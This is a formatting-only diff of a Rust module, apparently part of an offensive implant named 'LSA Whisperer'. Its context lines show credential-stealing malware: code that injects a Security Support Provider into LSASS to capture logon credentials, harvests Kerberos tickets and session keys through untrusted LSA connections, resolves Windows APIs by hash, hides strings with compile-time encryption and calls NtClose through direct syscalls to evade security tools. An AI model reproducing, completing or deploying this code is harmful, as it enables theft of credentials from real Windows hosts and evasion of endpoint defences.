@@ -47,7 +47,7 @@ use serde::Serialize;
 use std::ptr;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::{Mutex, OnceLock};
-use winapi::shared::ntdef::{ULONG, PVOID, UNICODE_STRING};
+use winapi::shared::ntdef::{PVOID, ULONG, UNICODE_STRING};
 use winapi::um::winnt::HANDLE;
 
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
@@ -90,25 +90,25 @@ type FnLsaConnectUntrusted = unsafe extern "system" fn(
 ) -> i32; // NTSTATUS
 
 type FnLsaCallAuthenticationPackage = unsafe extern "system" fn(
-    HANDLE,      // LsaHandle
-    ULONG,       // AuthenticationPackage
-    *const u8,   // ProtocolSubmitBuffer
-    ULONG,       // SubmitBufferLength
+    HANDLE,       // LsaHandle
+    ULONG,        // AuthenticationPackage
+    *const u8,    // ProtocolSubmitBuffer
+    ULONG,        // SubmitBufferLength
     *mut *mut u8, // ProtocolReturnBuffer
-    *mut ULONG,  // ReturnBufferLength
-    *mut i32,    // ProtocolStatus
+    *mut ULONG,   // ReturnBufferLength
+    *mut i32,     // ProtocolStatus
 ) -> i32; // NTSTATUS
 
 type FnLsaLookupAuthenticationPackage = unsafe extern "system" fn(
-    HANDLE,              // LsaHandle
+    HANDLE,                // LsaHandle
     *const UNICODE_STRING, // PackageName
-    *mut ULONG,          // AuthenticationPackage
+    *mut ULONG,            // AuthenticationPackage
 ) -> i32; // NTSTATUS
 
 type FnLsaRegisterLogonProcess = unsafe extern "system" fn(
     *const UNICODE_STRING, // LogonProcessName
-    *mut HANDLE,          // LsaHandle
-    *mut u64,             // SecurityMode (LSA_OPERATIONAL_MODE)
+    *mut HANDLE,           // LsaHandle
+    *mut u64,              // SecurityMode (LSA_OPERATIONAL_MODE)
 ) -> i32; // NTSTATUS
 
 type FnLsaDeregisterLogonProcess = unsafe extern "system" fn(
@@ -145,10 +145,7 @@ unsafe fn resolve_lsa_apis() -> Result<LsaApis> {
     }
 
     Ok(LsaApis {
-        connect_untrusted: resolve_fn!(
-            pe_resolve::HASH_LSACONNECTUNTRUSTED,
-            "LsaConnectUntrusted"
-        ),
+        connect_untrusted: resolve_fn!(pe_resolve::HASH_LSACONNECTUNTRUSTED, "LsaConnectUntrusted"),
         call_auth_package: resolve_fn!(
             pe_resolve::HASH_LSACALLAUTHENTICATIONPACKAGE,
             "LsaCallAuthenticationPackage"
@@ -288,11 +285,7 @@ impl LsaHandle {
         let mut lsa_name = make_lsa_unicode_string(process_name_wide);
         let mut handle: HANDLE = ptr::null_mut();
         let mut security_mode: u64 = 0;
-        let status = (apis.register_logon_process)(
-            &lsa_name,
-            &mut handle,
-            &mut security_mode,
-        );
+        let status = (apis.register_logon_process)(&lsa_name, &mut handle, &mut security_mode);
         if !nt_success(status) {
             bail!(
                 "{}",
@@ -471,8 +464,7 @@ struct KerbRetrieveTicketRequest {
 /// an untrusted LSA connection cannot retrieve NT hashes, and WDigest
 /// plaintext caching is disabled by default since Windows 8.1.
 fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
-    let deadline = std::time::Instant::now()
-        + std::time::Duration::from_secs(timeout_secs);
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout_secs);
     let mut credentials = Vec::new();
 
     // Resolve LSA APIs via the global OnceLock (no per-call leak).
@@ -603,8 +595,7 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 /// subsequent logons.  Credentials are buffered and returned immediately
 /// (for already-captured data) plus the SSP stays active for future captures.
 fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
-    let deadline = std::time::Instant::now()
-        + std::time::Duration::from_secs(timeout_secs);
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout_secs);
 
     // Check if we already have an SSP injected and have buffered data.
     {
@@ -665,10 +656,9 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     })?;
 
     // Try to register as a logon process (requires SeTcbPrivilege / admin).
-    let proc_name =
-        String::from_utf8_lossy(&string_crypt::enc_str!("SecLogonSSP\0"))
-            .trim_end_matches('\0')
-            .to_string();
+    let proc_name = String::from_utf8_lossy(&string_crypt::enc_str!("SecLogonSSP\0"))
+        .trim_end_matches('\0')
+        .to_string();
     let proc_name_wide: Vec<u16> = proc_name.encode_utf16().collect();
 
     let _lsa = match unsafe { LsaHandle::register_logon_process(apis_ref, &proc_name_wide) } {
@@ -795,9 +785,8 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                         // Wait briefly for the SSP to start capturing credentials,
                         // then poll the shared memory.
                         let poll_start = std::time::Instant::now();
-                        let poll_deadline = deadline.min(
-                            poll_start + std::time::Duration::from_secs(15)
-                        );
+                        let poll_deadline =
+                            deadline.min(poll_start + std::time::Duration::from_secs(15));
 
                         while std::time::Instant::now() < poll_deadline {
                             if CANCELLED.load(Ordering::Relaxed) {
@@ -806,7 +795,9 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                             std::thread::sleep(std::time::Duration::from_millis(500));
 
                             let mut ssp_creds = Vec::new();
-                            match crate::lsa_whisperer_ssp::read_captured_credentials(&mut ssp_creds) {
+                            match crate::lsa_whisperer_ssp::read_captured_credentials(
+                                &mut ssp_creds,
+                            ) {
                                 Ok(n) if n > 0 => {
                                     log::info!(
                                         "LSA Whisperer: captured {} credentials from SSP in LSASS",
@@ -908,10 +899,10 @@ fn parse_kerb_tkt_cache(resp: &[u8], base_ptr: usize, credentials: &mut Vec<Whis
 
         if let Some(client_name) = read_unicode_string_at(resp, base, base_ptr) {
             if let Some(client_realm) = read_unicode_string_at(resp, base + 16, base_ptr) {
-                let server_name = read_unicode_string_at(resp, base + 32, base_ptr)
-                    .unwrap_or_default();
-                let server_realm = read_unicode_string_at(resp, base + 48, base_ptr)
-                    .unwrap_or_default();
+                let server_name =
+                    read_unicode_string_at(resp, base + 32, base_ptr).unwrap_or_default();
+                let server_realm =
+                    read_unicode_string_at(resp, base + 48, base_ptr).unwrap_or_default();
 
                 let description = if !server_name.is_empty() {
                     format!("{}_{}_{}", server_realm, server_name, i)
@@ -963,8 +954,7 @@ fn parse_kerb_retrieve_ticket(
     // Session key type is at offset 56 (after MessageType + flags + timestamps).
     // Session key is a KERB_CRYPTO_KEY: { KeyType: LONG, Length: ULONG, Value: *PUCHAR }
     let key_type = i32::from_le_bytes(resp[56..60].try_into().unwrap_or([0; 4]));
-    let key_length =
-        u32::from_le_bytes(resp[60..64].try_into().unwrap_or([0; 4])) as usize;
+    let key_length = u32::from_le_bytes(resp[60..64].try_into().unwrap_or([0; 4])) as usize;
 
     // Session key value pointer (64-bit) at offset 64.
     let key_value_ptr = if resp.len() >= 72 {
@@ -1154,9 +1144,11 @@ pub fn harvest_lsa(method: &common::LsaMethod, timeout_secs: u64) -> Result<Stri
 pub fn whisperer_status() -> Result<String> {
     let status = WhispererStatus {
         active_method: if SSP_INJECTED.load(Ordering::Relaxed) {
-            Some(String::from_utf8_lossy(&string_crypt::enc_str!("ssp_inject"))
-                .trim_end_matches('\0')
-                .to_string())
+            Some(
+                String::from_utf8_lossy(&string_crypt::enc_str!("ssp_inject"))
+                    .trim_end_matches('\0')
+                    .to_string(),
+            )
         } else {
             None
         },
@@ -1180,18 +1172,18 @@ pub fn whisperer_stop() -> Result<String> {
     if injection_base != 0 && proc_handle != 0 {
         // Free the allocated memory in LSASS.
         if let Err(e) = crate::lsa_whisperer_ssp::free_lsass_memory(proc_handle, injection_base) {
-            log::warn!(
-                "LSA Whisperer: failed to free LSASS injection memory: {e:#}"
-            );
+            log::warn!("LSA Whisperer: failed to free LSASS injection memory: {e:#}");
         }
 
         // Close the LSASS process handle via NtClose.
         if let Ok(close_tgt) = crate::syscalls::get_syscall_id("NtClose") {
-            let _ = unsafe { crate::syscalls::do_syscall(
-                close_tgt.ssn,
-                close_tgt.gadget_addr,
-                &[proc_handle as u64],
-            ) };
+            let _ = unsafe {
+                crate::syscalls::do_syscall(
+                    close_tgt.ssn,
+                    close_tgt.gadget_addr,
+                    &[proc_handle as u64],
+                )
+            };
         }
 
         log::info!(
@@ -1224,7 +1216,9 @@ pub fn whisperer_stop() -> Result<String> {
         .trim_end_matches('\0')
     );
 
-    Ok(String::from_utf8_lossy(&string_crypt::enc_str!("LSA Whisperer stopped"))
-        .trim_end_matches('\0')
-        .to_string())
+    Ok(
+        String::from_utf8_lossy(&string_crypt::enc_str!("LSA Whisperer stopped"))
+            .trim_end_matches('\0')
+            .to_string(),
+    )
 }
